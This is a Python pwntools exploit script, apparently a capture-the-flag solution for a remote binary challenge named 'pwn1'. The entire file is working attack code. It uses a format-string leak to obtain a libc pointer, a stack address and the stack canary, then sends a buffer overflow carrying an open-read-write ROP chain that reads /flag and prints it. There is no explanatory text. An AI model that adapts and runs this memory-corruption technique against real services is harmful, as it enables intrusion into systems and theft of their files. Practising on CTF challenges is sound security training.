from pwn import *

context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF('./pwn1')

#p = process('./pwn1')
#attach(p,'b *0x00000000040077C')
p = remote('node4.buuoj.cn','26844')
def leak():
	p.recvuntil('Welcome! What is your name?\n')
	p.sendline('AAAAAAAA-%25$p-%28$p-%27$paaaaaa'+'/flag\x00'.ljust(8,'\x00'))
	p.recvuntil('AAAAAAAA-')
	
leak()

std = int(p.recv(14),16)
print "setvbuf"+'[+]=>'+hex(std)
libc_base = std - 324 - libc.sym['setvbuf']
print "libc_base=>[+]"+hex(libc_base)

p.recv(1)
stack = int(p.recv(14),16)
print "stack=>[+]"+hex(stack)
target = stack - 0x100 + 0x18 + 0x8
print "target=>[+]"+hex(target)
p.recv(1)
canary = int(p.recv(18),16)
print "canary=>[+]"+hex(canary)
pause()
p.recvuntil('What can we help you?\n')

flag_addr = target

pop_rdi_ret = 0x0000000000021112 + libc_base
pop_rsi_ret = 0x00000000000202f8 + libc_base
pop_rdx_ret = 0x0000000000001b92 + libc_base

orw = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(4) + p64(libc_base + libc.sym['open'])
orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x100) + p64(libc_base + libc.sym['read'])
orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x100) + p64(libc_base + libc.sym['write'])


payload = 'a'*0x68 + p64(canary) + p64(0)+ orw
p.sendline(payload)
pause()
p.interactive()
